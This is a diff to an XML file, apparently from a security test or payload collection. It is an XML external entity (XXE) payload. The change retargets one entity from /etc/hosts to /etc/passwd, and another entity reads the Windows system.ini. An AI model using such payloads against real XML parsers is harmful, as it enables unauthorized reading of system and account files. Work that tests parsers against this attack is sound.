@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <?xml-stylesheet type="text/xml" href="?#"?>
 <!DOCTYPE div [
-  <!ENTITY passwd SYSTEM "file:///etc/hosts">
+  <!ENTITY passwd SYSTEM "file:///etc/passwd">
   <!ENTITY sysini SYSTEM "file:///c:/windows/system.ini">
 ]>
 <div>
